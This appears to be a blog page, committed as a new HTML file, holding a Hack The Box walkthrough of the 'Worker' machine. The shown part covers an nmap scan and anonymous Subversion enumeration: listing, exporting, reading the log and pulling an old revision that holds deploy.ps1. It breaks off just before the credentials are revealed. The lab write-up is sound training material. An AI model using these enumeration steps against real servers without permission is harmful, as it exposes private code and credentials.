@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 WindowsDifficulty:	MediumPoints:	30Release:	15 Aug 2020IP:	10.10.10.203 User Blood haqpl 00 days, 01 hours, 29 mins, 58 seconds.Root Blood qtc	 00 days, 03 hours, 10 mins, 42 seconds.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[worker]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/08/18/worker/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 WindowsDifficulty:	MediumPoints:	30Release:	15 Aug 2020IP:	10.10.10.203 User Blood haqpl 00 days, 01 hours, 29 mins, 58 seconds.Root Blood qtc	 00 days, 03 hours, 10 mins, 42 seconds.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb64.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb65.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb66.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb67.jpg">
+<meta property="article:published_time" content="2020-08-18T09:42:21.000Z">
+<meta property="article:modified_time" content="2021-01-31T03:58:37.652Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb64.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/08/18/worker/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/08/18/worker/","path":"2020/08/18/worker/","title":"Hack-The-Box-walkthrough[worker]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[worker] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web"><span class="nav-number">3.</span> <span class="nav-text">web</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#svnserve-Subversion"><span class="nav-number">4.</span> <span class="nav-text">svnserve Subversion</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-root"><span class="nav-number">5.</span> <span class="nav-text">get root</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">5.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Contact-me"><span class="nav-number">5.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/08/18/worker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[worker] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[worker]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-08-18 17:42:21" itemprop="dateCreated datePublished" datetime="2020-08-18T17:42:21+08:00">2020-08-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-01-31 11:58:37" itemprop="dateModified" datetime="2021-01-31T11:58:37+08:00">2021-01-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Windows<br>Difficulty:	Medium<br>Points:	30<br>Release:	15 Aug 2020<br>IP:	10.10.10.203</p>
+<p>User Blood haqpl 00 days, 01 hours, 29 mins, 58 seconds.<br>Root Blood qtc	 00 days, 03 hours, 10 mins, 42 seconds.</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb64.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.203</span></span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">80/tcp   open  http     Microsoft IIS httpd 10.0</span><br><span class="line">3690/tcp open  svnserve Subversion</span><br><span class="line">5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>then browser to the following url</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.203/</span><br></pre></td></tr></table></figure>
+
+<p>shows us a default IIS webpage:</p>
+<h3 id="svnserve-Subversion"><a href="#svnserve-Subversion" class="headerlink" title="svnserve Subversion"></a>svnserve Subversion</h3><p>looking around and found the following website:</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucGVyZm9yY2UuY29tL2Jsb2cvdmNzL3N2bi1jb21tYW5kcy1jaGVhdC1zaGVldA==">SVN Commands Cheat Sheet<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>With this article we should be able to enumerate this service</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># svn list svn://10.10.10.203</span></span><br><span class="line">dimension.worker.htb/</span><br><span class="line">moved.txt</span><br></pre></td></tr></table></figure>
+
+<p>time to download those files</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/worker<span class="comment"># svn export svn://10.10.10.203/moved.txt</span></span><br><span class="line">A    moved.txt</span><br><span class="line">完成导出。</span><br><span class="line">root@kali:~/hackthebox/machine/worker<span class="comment"># ls</span></span><br><span class="line">moved.txt</span><br><span class="line">root@kali:~/hackthebox/machine/worker<span class="comment"># cat moved.txt</span></span><br><span class="line">This repository has been migrated and will no longer be maintaned here.</span><br><span class="line">You can find the latest version at: http://devops.worker.htb</span><br><span class="line"></span><br><span class="line">// The Worker team :)</span><br></pre></td></tr></table></figure>
+
+<p>seen a new host name so also should add that to our &#x2F;etc&#x2F;hosts</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://devops.worker.htb</span><br></pre></td></tr></table></figure>
+
+<p>look at the dimensions page, find again a lot sub domains:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://alpha.worker.htb/</span><br><span class="line">http://cartoon.worker.htb/</span><br><span class="line">http://lens.worker.htb/</span><br><span class="line">http://solid-state.worker.htb/</span><br><span class="line">http://spectral.worker.htb/</span><br><span class="line">http://story.worker.htb/</span><br></pre></td></tr></table></figure>
+
+<p>also added them to my &#x2F;etc&#x2F;hosts file but couldn’t find there anything for now.<br>when we look at devops.worker.htb we getting asked for credentials:</p>
+<p>looking back at the svn service there could also be revisions, lets see if that’s here the case:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># svn info svn://10.10.10.203</span></span><br><span class="line">路径: .</span><br><span class="line">URL: svn://10.10.10.203</span><br><span class="line">Relative URL: ^/</span><br><span class="line">版本库根: svn://10.10.10.203</span><br><span class="line">版本库 UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1</span><br><span class="line">版本: 5</span><br><span class="line">节点种类: 目录</span><br><span class="line">最后修改的作者: nathen</span><br><span class="line">最后修改的版本: 5</span><br><span class="line">最后修改的时间: 2020-06-20 09:52:00 -0400 (六, 2020-06-20)</span><br></pre></td></tr></table></figure>
+
+<p>looks like there is we also see an potential username: nathen<br>let’s see if we can get some more info about these revisions</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># svn log svn://10.10.10.203</span></span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">r5 | nathen | 2020-06-20 09:52:00 -0400 (六, 2020-06-20) | 1 行</span><br><span class="line"></span><br><span class="line">Added note that repo has been migrated</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">r4 | nathen | 2020-06-20 09:50:20 -0400 (六, 2020-06-20) | 1 行</span><br><span class="line"></span><br><span class="line">Moving this repo to our new devops server <span class="built_in">which</span> will handle the deployment <span class="keyword">for</span> us</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">r3 | nathen | 2020-06-20 09:46:19 -0400 (六, 2020-06-20) | 1 行</span><br><span class="line"></span><br><span class="line">-</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">r2 | nathen | 2020-06-20 09:45:16 -0400 (六, 2020-06-20) | 1 行</span><br><span class="line"></span><br><span class="line">Added deployment script</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">r1 | nathen | 2020-06-20 09:43:43 -0400 (六, 2020-06-20) | 1 行</span><br><span class="line"></span><br><span class="line">First version</span><br><span class="line">------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>then download these files:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/worker<span class="comment"># svn export -r 2 svn://10.10.10.203 –force</span></span><br><span class="line">A    –force</span><br><span class="line">A    –force/deploy.ps1</span><br><span class="line">A    –force/dimension.worker.htb</span><br><span class="line">A    –force/dimension.worker.htb/LICENSE.txt</span><br><span class="line">A    –force/dimension.worker.htb/README.txt</span><br><span class="line">A    –force/dimension.worker.htb/assets</span><br><span class="line">A    –force/dimension.worker.htb/assets/css</span><br><span class="line">A    –force/dimension.worker.htb/assets/css/fontawesome-all.min.css</span><br><span class="line">A    –force/dimension.worker.htb/assets/css/main.css</span><br><span class="line">A    –force/dimension.worker.htb/assets/css/noscript.css</span><br><span class="line">A    –force/dimension.worker.htb/assets/js</span><br><span class="line">A    –force/dimension.worker.htb/assets/js/breakpoints.min.js</span><br><span class="line">A    –force/dimension.worker.htb/assets/js/browser.min.js</span><br><span class="line">A    –force/dimension.worker.htb/assets/js/jquery.min.js</span><br><span class="line">A    –force/dimension.worker.htb/assets/js/main.js</span><br><span class="line">A    –force/dimension.worker.htb/assets/js/util.js</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/base</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/base/_page.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/base/_reset.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/base/_typography.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/components</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/components/_actions.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/components/_box.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/components/_button.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/components/_form.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/components/_icon.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/components/_icons.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/components/_image.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/components/_list.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/components/_table.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/layout</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/layout/_bg.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/layout/_footer.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/layout/_header.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/layout/_main.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/layout/_wrapper.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/libs</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/libs/_breakpoints.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/libs/_functions.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/libs/_mixins.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/libs/_vars.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/libs/_vendor.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/main.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/sass/noscript.scss</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-brands-400.eot</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-brands-400.svg</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-brands-400.ttf</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-brands-400.woff</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-brands-400.woff2</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-regular-400.eot</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-regular-400.svg</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-regular-400.ttf</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-regular-400.woff</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-regular-400.woff2</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-solid-900.eot</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-solid-900.svg</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-solid-900.ttf</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-solid-900.woff</span><br><span class="line">A    –force/dimension.worker.htb/assets/webfonts/fa-solid-900.woff2</span><br><span class="line">A    –force/dimension.worker.htb/images</span><br><span class="line">A    –force/dimension.worker.htb/images/bg.jpg</span><br><span class="line">A    –force/dimension.worker.htb/images/overlay.png</span><br><span class="line">A    –force/dimension.worker.htb/images/pic01.jpg</span><br><span class="line">A    –force/dimension.worker.htb/images/pic02.jpg</span><br><span class="line">A    –force/dimension.worker.htb/images/pic03.jpg</span><br><span class="line">A    –force/dimension.worker.htb/index.html</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>then look at the deploy.ps1 we see some credentials:</p>
